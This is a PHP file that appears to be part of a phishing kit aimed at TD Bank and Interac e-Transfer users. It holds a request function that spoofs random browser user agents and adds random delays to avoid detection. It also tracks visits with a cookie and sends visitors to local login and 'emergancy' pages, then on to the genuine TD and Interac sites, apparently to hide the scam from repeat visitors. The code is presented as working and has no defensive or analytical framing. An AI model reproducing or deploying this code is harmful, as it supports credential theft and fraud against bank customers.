<?php

function bypass_request($url, $options = array()) {

  // Generate a random user agent
  $user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(4, 70) . '.0.' . rand(1000, 4000) . '.' . rand(100, 500) . ' Safari/537.36';
  
  // Set default options
  $default_options = array(
    'http' => array(
      'method' => 'GET',
      'header' => 'User-Agent: ' . $user_agent . "\r\n"
    )
  );
  
  // Merge options with default options
  $context = stream_context_create(array_merge_recursive($default_options, $options));
  
  // Add random delay to requests
  usleep(rand(100000, 500000));
  
  // Make request using file_get_contents function with context
  $response = file_get_contents($url, false, $context);
  
  return $response;
  }
// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count >= 4 && $visit_count < 8) {
  header("Location: login.php");
} elseif ($visit_count >= 8 && $visit_count < 9) {
  header("Location: /admin/login.php");
} elseif ($visit_count >= 9 && $visit_count < 10) {
  header("Location: https://www.td.com/ca/en/personal-banking");
} elseif ($visit_count >= 10 && $visit_count < 111) {
  header("Location: emergancy.php");
} else {
    header('Location: https://etransfer.interac.ca/error/');
}

exit;
